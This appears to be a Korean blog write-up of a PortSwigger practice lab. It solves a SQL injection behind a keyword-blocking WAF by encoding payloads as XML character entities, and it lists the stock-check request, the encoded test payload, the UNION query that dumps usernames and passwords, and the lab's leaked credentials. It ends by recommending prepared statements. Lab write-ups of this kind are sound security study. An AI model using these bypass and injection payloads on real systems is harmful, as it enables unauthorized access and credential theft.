+++
date = '2026-05-21T19:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - SQL injection with filter bypass via XML encoding'
summary = "XML 입력을 파싱하기 전에 SQL 키워드를 차단하는 WAF를, 문자 엔티티 인코딩(파싱 불일치)으로 우회해 UNION 공격으로 administrator 계정 정보를 탈취하는 풀이"
toc = true
tags = ["SQL Injection", "UNION-Based", "WAF Bypass", "PortSwigger", "Practitioner"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab**: [SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

> ![image.png](/writeup/portswigger/sqli/16/1.png)

재고 확인 기능에 SQL Injection 취약점이 존재하며, 쿼리 결과가 애플리케이션 응답에 포함된다.  
따라서 UNION attack이 가능하며, 이를 통해 `users` 테이블에서 administrator 계정 정보를 획득해 로그인하면 문제가 해결된다. 단, SQL 공격 구문을 차단하는 필터(WAF)가 있어 XML 인코딩으로 우회해야 한다.

### SQL Injection 진단

재고 조회 요청은 다음과 같이 XML 형식으로 `productId` 와 `storeId` 를 전달한다.

```http
POST /product/stock HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<session>
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

응답으로는 재고 수량(`401 units`)이 반환된다.  
`productId` 에 `1-0` 을 삽입해도 결과가 그대로인 것으로 보아 입력값이 SQL 쿼리에 그대로 들어가는 주입 지점임을 알 수 있다.  
그런데 이 지점에 `AND 1=1` 을 삽입하니 `Attack detected` 가 반환되어, SQL 공격 구문을 차단하는 필터가 존재함을 확인했다.

### XML 엔티티 인코딩으로 필터 우회

WAF는 XML이 파싱되기 전의 원문에서 SQL 키워드를 탐지해 차단하지만, XML 파서는 `&#NN;` 형태의 문자 엔티티를 자동으로 디코딩한다. 이 처리 순서 차이를 이용해 SQL 키워드를 문자 엔티티로 인코딩한다. (Burp의 Hackvertor 확장에서 `dec_entities` 등으로 인코딩할 수 있다.)

```
1 AND 1=1
-> &#49;&#32;&#65;&#78;&#68;&#32;&#49;&#61;&#49;
```

인코딩한 페이로드를 전송하면 정상적으로 조회가 이루어지므로, XML 엔티티 인코딩으로 필터 우회가 가능함을 확인할 수 있다.

---

## 익스플로잇

먼저 `1 UNION SELECT NULL` 을 인코딩해 삽입하면 `storeId` 조회 결과에 null이 함께 반환되어, 단일 컬럼이며 해당 위치가 `WHERE` 절의 끝임을 알 수 있다.  
이를 바탕으로 계정 정보를 조회하는 전체 페이로드를 구성한다.

```sql
1 UNION SELECT username||':'||password FROM users
```

위 페이로드를 XML 엔티티로 인코딩해 전송하면 계정 정보가 반환된다.

```
wiener:xnskburds1gw3negpfi4
carlos:h5xwksdpv1ngj6b4r54u
administrator:8stdfmdv1jeyavy4qfau
```

이 중 administrator 계정으로 로그인하면 문제가 해결된다.

![image.png](/writeup/portswigger/sqli/16/2.png)

---

## 정리

이 랩의 핵심은 SQL Injection 자체보다 WAF 우회에 있다.  
애플리케이션이 XML 바디를 파싱하기 전에 원문에서 SQL 키워드를 탐지해 차단하지만, XML 파서는 `&#NN;` 같은 문자 엔티티를 자동으로 디코딩한다. 즉 필터는 인코딩된 원문을 보고, DB는 디코딩된 값을 본다. 이 처리 순서 차이를 이용하면 키워드를 엔티티로 인코딩해 필터를 통과시키면서도 실제로는 정상 SQL로 해석되게 만들 수 있다.  
이는 하나의 입력을 여러 계층이 서로 다른 시점에 해석할 때 발생하는 전형적인 파싱 불일치(parser differential) 문제다. 근본적인 방어는 이러한 시그니처 기반 입력 필터링이 아니라, 입력값을 데이터로만 처리하는 Prepared Statement에 있다.